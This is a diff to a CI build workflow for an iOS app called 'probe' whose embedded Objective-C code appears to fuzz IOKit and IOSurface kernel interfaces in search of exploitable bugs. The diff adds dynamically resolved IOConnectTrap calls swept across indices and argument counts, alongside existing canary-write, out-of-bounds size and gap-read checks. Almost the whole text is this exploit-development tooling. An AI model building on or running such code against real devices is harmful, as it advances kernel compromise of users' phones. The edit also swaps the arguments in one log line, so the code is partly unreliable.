@@ -30,6 +30,7 @@ jobs:
           #define PROBE_STUB_IOSURFACE_H
           #include <stdint.h>
           #include <stddef.h>
+          #include <mach/mach.h>
           #include <CoreFoundation/CoreFoundation.h>
           typedef struct __IOSurface *IOSurfaceRef;
           uint32_t IOSurfaceGetID(IOSurfaceRef buffer);
@@ -76,6 +77,14 @@ jobs:
           typedef IOSurfaceRef (*fn_getsurf)(CVPixelBufferRef);
           typedef kern_return_t (*fn_addclient)(io_connect_t, io_connect_t);
 
+          typedef kern_return_t (*fn_trap0)(io_connect_t, uint32_t);
+          typedef kern_return_t (*fn_trap1)(io_connect_t, uint32_t, uintptr_t);
+          typedef kern_return_t (*fn_trap2)(io_connect_t, uint32_t, uintptr_t, uintptr_t);
+          typedef kern_return_t (*fn_trap3)(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t);
+          typedef kern_return_t (*fn_trap4)(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);
+          typedef kern_return_t (*fn_trap5)(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);
+          typedef kern_return_t (*fn_trap6)(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);
+
           static fn_surfcreate g_surfcreate = NULL;
           static fn_surflock g_surflock = NULL;
           static fn_surfunlock g_surfunlock = NULL;
@@ -85,7 +94,15 @@ jobs:
           static fn_getsurf g_getsurf = NULL;
           static fn_addclient g_addclient = NULL;
 
-          #define BUILD_TAG "v59-addclient"
+          static fn_trap0 g_trap0 = NULL;
+          static fn_trap1 g_trap1 = NULL;
+          static fn_trap2 g_trap2 = NULL;
+          static fn_trap3 g_trap3 = NULL;
+          static fn_trap4 g_trap4 = NULL;
+          static fn_trap5 g_trap5 = NULL;
+          static fn_trap6 g_trap6 = NULL;
+
+          #define BUILD_TAG "v60-traps"
           #define MAXC 96
           #define STEP_MAX 22
           #define TRY_MAX 2
@@ -262,7 +279,7 @@ jobs:
           static void refresh_counts(void) {
               NSString* st = [NSString stringWithContentsOfFile:doc_file("state.txt") encoding:NSUTF8StringEncoding error:nil];
               if (!st) return;
-              int pr = 0, w = 0, ob = 0, gp = 0, ow = 0, nb = 0, so = 0, ao = 0;
+              int pr = 0, w = 0, ob = 0, gp = 0, ow = 0, nb = 0, so = 0, ao = 0, to = 0;
               for (NSString* ln in [st componentsSeparatedByString:@"\n"]) {
                   if ([ln hasPrefix:@"CAN "]) { pr++; if ([ln rangeOfString:@"hit=1"].location != NSNotFound) w++; continue; }
                   if ([ln hasPrefix:@"OOBSZ "]) ob++;
@@ -271,8 +288,9 @@ jobs:
                   if ([ln hasPrefix:@"P "]) nb++;
                   if ([ln hasPrefix:@"SO0 "]) so++;
                   if ([ln hasPrefix:@"ADD OK"]) ao++;
+                  if ([ln hasPrefix:@"TRAP "] && [ln rangeOfString:@"-> OK"].location != NSNotFound) to++;
               }
-              g_probes = pr; g_canary_w = w; g_oobsz = ob; g_gapread = gp; g_outw = ow; g_nonbad = nb; g_s0nz = so; g_addok = ao;
+              g_probes = pr; g_canary_w = w; g_oobsz = ob; g_gapread = gp; g_outw = ow; g_nonbad = nb; g_s0nz = so; g_addok = ao; g_trap_ok = to;
           }
           static void load_state(void) {
               NSString* s = [NSString stringWithContentsOfFile:doc_file("state.txt") encoding:NSUTF8StringEncoding error:nil];
@@ -618,24 +636,30 @@ jobs:
           }
 
           static void traps(void) {
+              if (!g_trap0 && !g_trap1 && !g_trap2 && !g_trap3 && !g_trap4 && !g_trap5 && !g_trap6) {
+                  plog(@"TRAP nosyms"); ulog(@"TRAP no syms"); return;
+              }
               ulog(@"TRAP start conns=%d", g_nconn);
               for (int ci = 0; ci < g_nconn; ci++) {
                   if (!g_conn[ci]) continue;
-                  for (uint32_t idx = 0; idx <= 6; idx++) {
-                      kern_return_t kr;
-                      switch (idx) {
-                          case 0: kr = IOConnectTrap0(g_conn[ci], 0); break;
-                          case 1: kr = IOConnectTrap1(g_conn[ci], 0, (uintptr_t)g_conn[ci]); break;
-                          case 2: kr = IOConnectTrap2(g_conn[ci], 0, (uintptr_t)g_conn[ci], (uintptr_t)g_sid); break;
-                          case 3: kr = IOConnectTrap3(g_conn[ci], 0, (uintptr_t)g_conn[ci], (uintptr_t)g_sid, 4096); break;
-                          case 4: kr = IOConnectTrap4(g_conn[ci], 0, (uintptr_t)g_conn[ci], (uintptr_t)g_sid, 4096, 0); break;
-                          case 5: kr = IOConnectTrap5(g_conn[ci], 0, (uintptr_t)g_conn[ci], (uintptr_t)g_sid, 4096, 0, 0); break;
-                          default: kr = IOConnectTrap6(g_conn[ci], 0, (uintptr_t)g_conn[ci], (uintptr_t)g_sid, 4096, 0, 0, 0); break;
+                  for (uint32_t idx = 0; idx <= 2; idx++) {
+                      for (int n = 0; n <= 6; n++) {
+                          kern_return_t kr = (kern_return_t)0xe00002c7;
+                          uintptr_t a1 = (uintptr_t)g_conn[ci], a2 = (uintptr_t)g_sid, a3 = 4096, a4 = 0, a5 = 0, a6 = 0;
+                          switch (n) {
+                              case 0: if (g_trap0) kr = g_trap0(g_conn[ci], idx); break;
+                              case 1: if (g_trap1) kr = g_trap1(g_conn[ci], idx, a1); break;
+                              case 2: if (g_trap2) kr = g_trap2(g_conn[ci], idx, a1, a2); break;
+                              case 3: if (g_trap3) kr = g_trap3(g_conn[ci], idx, a1, a2, a3); break;
+                              case 4: if (g_trap4) kr = g_trap4(g_conn[ci], idx, a1, a2, a3, a4); break;
+                              case 5: if (g_trap5) kr = g_trap5(g_conn[ci], idx, a1, a2, a3, a4, a5); break;
+                              default: if (g_trap6) kr = g_trap6(g_conn[ci], idx, a1, a2, a3, a4, a5, a6); break;
+                          }
+                          __sync_fetch_and_add(&g_done, 1);
+                          plog(@"TRAP n%d idx%u a%d -> %@", g_node[ci], idx, n, kr_name(kr));
+                          if (kr == KERN_SUCCESS) { __sync_fetch_and_add(&g_trap_ok, 1); ulog(@"!!! TRAP n%d idx%u a%d OK", g_node[ci], idx, n); }
+                          usleep(50);
                       }
-                      __sync_fetch_and_add(&g_done, 1);
-                      plog(@"TRAP n%d idx%u -> %@", g_node[ci], idx, kr_name(kr));
-                      if (kr == KERN_SUCCESS) { __sync_fetch_and_add(&g_trap_ok, 1); ulog(@"!!! TRAP n%d idx%u OK", g_node[ci], idx); }
-                      usleep(60);
                   }
               }
               ulog(@"trap done ok=%d", g_trap_ok);
@@ -765,7 +789,7 @@ jobs:
                       }
                       if (szb > zos) {
                           __sync_fetch_and_add(&g_oobsz, 1);
-                          ulog(@"!!! CAN %s SZB %zu > offered %zu", tag, szb, zos);
+                          ulog(@"!!! CAN %s SZB %zu > offered %zu", tag, zos, szb);
                           plog(@"OOBSZ %s offered=%zu driver=%zu", tag, zos, szb);
                       }
                       usleep(150);
@@ -895,6 +919,7 @@ jobs:
               void* is = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
               if (!is) is = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
               void* ik = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
+              void* ih = ik ? ik : RTLD_DEFAULT;
               g_surfcreate = (fn_surfcreate)dlsym(is ? is : RTLD_DEFAULT, "IOSurfaceCreate");
               g_surflock = (fn_surflock)dlsym(is ? is : RTLD_DEFAULT, "IOSurfaceLock");
               g_surfunlock = (fn_surfunlock)dlsym(is ? is : RTLD_DEFAULT, "IOSurfaceUnlock");
@@ -902,9 +927,18 @@ jobs:
               g_baseaddr = (fn_baseaddr)dlsym(is ? is : RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
               g_surfid = (fn_surfid)dlsym(is ? is : RTLD_DEFAULT, "IOSurfaceGetID");
               g_getsurf = (fn_getsurf)dlsym(RTLD_DEFAULT, "CVPixelBufferGetIOSurface");
-              g_addclient = (fn_addclient)dlsym(ik ? ik : RTLD_DEFAULT, "IOConnectAddClient");
-              plog(@"syms is=%p create=%p lock=%p base=%p alloc=%p addclient=%p", is, (void*)g_surfcreate, (void*)g_surflock, (void*)g_baseaddr, (void*)g_allocusize, (void*)g_addclient);
-              ulog(@"IOSurface=%s addclient=%s", is ? "ok" : "FAIL", g_addclient ? "ok" : "FAIL");
+              g_addclient = (fn_addclient)dlsym(ih, "IOConnectAddClient");
+              g_trap0 = (fn_trap0)dlsym(ih, "IOConnectTrap0");
+              g_trap1 = (fn_trap1)dlsym(ih, "IOConnectTrap1");
+              g_trap2 = (fn_trap2)dlsym(ih, "IOConnectTrap2");
+              g_trap3 = (fn_trap3)dlsym(ih, "IOConnectTrap3");
+              g_trap4 = (fn_trap4)dlsym(ih, "IOConnectTrap4");
+              g_trap5 = (fn_trap5)dlsym(ih, "IOConnectTrap5");
+              g_trap6 = (fn_trap6)dlsym(ih, "IOConnectTrap6");
+              plog(@"syms is=%p create=%p lock=%p base=%p alloc=%p addclient=%p traps=%d", is, (void*)g_surfcreate, (void*)g_surflock, (void*)g_baseaddr, (void*)g_allocusize, (void*)g_addclient,
+                   (g_trap0?1:0)+(g_trap1?1:0)+(g_trap2?1:0)+(g_trap3?1:0)+(g_trap4?1:0)+(g_trap5?1:0)+(g_trap6?1:0));
+              ulog(@"IOSurface=%s addclient=%s traps=%d", is ? "ok" : "FAIL", g_addclient ? "ok" : "FAIL",
+                   (g_trap0?1:0)+(g_trap1?1:0)+(g_trap2?1:0)+(g_trap3?1:0)+(g_trap4?1:0)+(g_trap5?1:0)+(g_trap6?1:0));
 
               plog(@"=== LAUNCH step=%d build=%s wake=0x%x", g_step, BUILD_TAG, g_wake);
               if (g_fd >= 0) fsync(g_fd);
@@ -926,8 +960,8 @@ jobs:
                   do_step(g_step);
                   int dh = g_hits - h0, dd = g_done - d0;
                   plog(@"STEP %d calls+%d hits+%d relive=%d", g_step, dd, dh, g_relive);
-                  plog(@"LIVE step=%d conns=%d vic=%d pair=%d probes=%d writes=%d oob=%d gap=%d outw=%d",
-                       g_step, g_nconn, g_vicn, g_pairn, g_probes, g_canary_w, g_oobsz, g_gapread, g_outw);
+                  plog(@"LIVE step=%d conns=%d vic=%d pair=%d probes=%d writes=%d oob=%d gap=%d outw=%d trapok=%d",
+                       g_step, g_nconn, g_vicn, g_pairn, g_probes, g_canary_w, g_oobsz, g_gapread, g_outw, g_trap_ok);
                   if (g_fd >= 0) fsync(g_fd);
                   ulog(@"STEP %d SURVIVED (+%d calls)", g_step, dd);
                   g_step++; save_step(g_step);
@@ -970,7 +1004,7 @@ jobs:
               [NSTimer scheduledTimerWithTimeInterval:0.25 repeats:YES block:^(NSTimer*) {
                   g_tick++;
                   if (g_tick % 4 == 0) refresh_counts();
-                  g_hb.text = [NSString stringWithFormat:@"%s %d/%d conn=%d vic=%d pair=%d pr=%d w=%d oob=%d gap=%d ow=%d add=%d", BUILD_TAG, g_step, STEP_MAX, g_nconn, g_vicn, g_pairn, g_probes, g_canary_w, g_oobsz, g_gapread, g_outw, g_addok];
+                  g_hb.text = [NSString stringWithFormat:@"%s %d/%d conn=%d vic=%d pair=%d pr=%d w=%d oob=%d gap=%d ow=%d add=%d tr=%d", BUILD_TAG, g_step, STEP_MAX, g_nconn, g_vicn, g_pairn, g_probes, g_canary_w, g_oobsz, g_gapread, g_outw, g_addok, g_trap_ok];
                   flush_ui();
               }];
               dispatch_after(dispatch_time(DISPATCH_TIME_NOW, NSEC_PER_SEC), dispatch_get_global_queue(0,0), ^{ run(); });
@@ -992,10 +1026,10 @@ jobs:
             <key>CFBundleIdentifier</key><string>com.buurza47.probe</string>
             <key>CFBundleInfoDictionaryVersion</key><string>6.0</string>
             <key>CFBundleName</key><string>probe</string>
-            <key>CFBundleDisplayName</key><string>buurd63</string>
+            <key>CFBundleDisplayName</key><string>buurd64</string>
             <key>CFBundlePackageType</key><string>APPL</string>
             <key>CFBundleShortVersionString</key><string>1.0</string>
-            <key>CFBundleVersion</key><string>63</string>
+            <key>CFBundleVersion</key><string>64</string>
             <key>MinimumOSVersion</key><string>16.0</string>
             <key>UIDeviceFamily</key><array><integer>1</integer><integer>2</integer></array>
             <key>UILaunchScreen</key><dict/>
